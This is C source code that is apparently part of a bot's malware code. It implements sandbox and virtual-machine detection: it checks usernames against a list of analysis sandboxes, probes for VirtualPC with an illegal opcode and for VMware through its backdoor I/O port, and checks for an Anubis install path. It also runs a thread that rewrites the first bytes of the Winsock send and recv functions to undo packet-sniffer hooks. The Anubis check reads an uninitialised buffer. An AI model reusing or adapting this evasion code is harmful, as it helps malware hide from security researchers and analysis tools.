#include "../h/includes.h"
#include "../h/functions.h"

int AntiSandBox()
{
	char *users[] = {"sandbox", "honey", "vmware", "currentuser", "nepenthes", "andy"}; // Add , "user"}; for anubis
	DWORD size = 128;
	char szUser[128];
	int i;
	fGetUserName(szUser, &size);
	CharLower(szUser);
	for (i = 0; i <	(sizeof(users) / sizeof(LPTSTR)); i++)
	{
		if (strstr(szUser, users[i]) != 0)
			 return TRUE;
	}
	return FALSE;
}

#ifndef NO_ANTIVM
DWORD __forceinline IsInsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep)
{
  PCONTEXT ctx = ep->ContextRecord;
  ctx->Ebx = -1;						// Not running VPC
  ctx->Eip += 4;						// skip past the "call VPC" opcodes
  return EXCEPTION_CONTINUE_EXECUTION;
}

bool DetectVPC()
{
	bool bVPCIsPresent = FALSE;

	__try
	{
		_asm push ebx
		_asm mov  ebx, 0 // It will stay ZERO if VPC is running
		_asm mov  eax, 1 // VPC function number
		_asm __emit 0Fh
		_asm __emit 3Fh
		_asm __emit 07h
		_asm __emit 0Bh
		_asm test ebx, ebx
		_asm setz [bVPCIsPresent]
		_asm pop ebx
	}

	__except(IsInsideVPC_exceptionFilter(GetExceptionInformation()))
	{
	}

	#ifdef DEBUG
	if (bVPCIsPresent==TRUE)
		DebugMsg("Bot is under VPC !");
	else
		DebugMsg("Bot is not running under VPC !");
	#endif

	return bVPCIsPresent;
}

bool DetectVMWare()
{
	bool bVMWareIsPresent = TRUE;
	__try
	{
		__asm
		{
			push   edx
			push   ecx
			push   ebx

			mov    eax, 'VMXh'
			mov    ebx, 0		// any value but not the MAGIC VALUE
			mov    ecx, 10		// get VMWare version
			mov    edx, 'VX'	// port number

			in     eax, dx		// read port
				 				// on return EAX returns the VERSION
			cmp    ebx, 'VMXh'	// is it a reply from VMWare?
			setz   [bVMWareIsPresent]	// set return value

			pop    ebx
			pop    ecx
			pop    edx
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		bVMWareIsPresent = FALSE;
	}

	#ifdef DEBUG
	if (bVMWareIsPresent==TRUE)
		DebugMsg("Bot is under VMWare !");
	else
		DebugMsg("Bot is not running under VMWare !");
	#endif

	return bVMWareIsPresent;
}

bool DetectAnubis()
{
	char szBotFile[MAX_PATH];
	bool bAnubisIsPresent = FALSE;

	if (strstr(szBotFile, "C:\\InsideTm\\"))
		bAnubisIsPresent = TRUE;

	#ifdef DEBUG
	if (bAnubisIsPresent==TRUE)
		DebugMsg("Bot is running under Anubis !");
	else
		DebugMsg("Bot is not running under Anubis !");
	#endif

	return bAnubisIsPresent;
}

bool IsProcessRunningUnderVM()
{
	bool bVMWare;
	bool bVPC;
	bool bAnubis;

	bVMWare	= DetectVMWare();
	bVPC	= DetectVPC();
	bAnubis	= DetectAnubis();

	if (bVPC==TRUE || bVMWare==TRUE || bAnubis==TRUE)
		return TRUE;

	return FALSE;
}
#endif


/*
   Anti WPE-Pro
   Coded by a59
*/
unsigned long __stdcall AntiWPEPro( void* pVoid )
{
   bool bHooked = false;
   unsigned char szBuffer[ 8 ];

   // First 6 bytes of of Send/Recv
   unsigned char bOriginal[ ] = "\x55"         // PUSH EBP
                         "\x8B\xEC\x83"   // MOV EBP, ESP
                         "\xEC\x10";   // SUB ESP, 10

   int i;

   unsigned long dwRecvCall = (unsigned long)GetProcAddress( GetModuleHandle( "WS2_32.dll" ), "recv" );
   unsigned long dwSendCall = (unsigned long)GetProcAddress( GetModuleHandle( "WS2_32.dll" ), "send" );

   while( true )
   {
      ReadProcessMemory( GetCurrentProcess( ), (void *)dwRecvCall, szBuffer, 6, 0 );

      for( i = 0; i < 6; i++ )
      {
         // If we find one part missing, write the original bytes back and break the loop
         if( bOriginal[ i ] != szBuffer[ i ] )
         {
            WriteProcessMemory( GetCurrentProcess( ), (void *)dwRecvCall, bOriginal, 6, 0 );
            break;
         }         
      }

      ReadProcessMemory( GetCurrentProcess( ), (void *)dwSendCall, szBuffer, 6, 0 );

      for( i = 0; i < 6; i++ )
      {
         // Send + Recvs first 6 bytes are the same, we can use the same buffer
         if( bOriginal[ i ] != szBuffer[ i ] )
         {
            WriteProcessMemory( GetCurrentProcess( ), (void *)dwSendCall, bOriginal, 6, 0 );
            break;
         }
      }

      Sleep( 500 );
   }

   return 0;
};

int main( )
{
   LoadLibrary( "WS2_32.dll" );
   CreateThread( 0, 0, &AntiWPEPro, 0, 0, 0 );

   getchar( );
   system( "PAUSE" );

   return 0;
};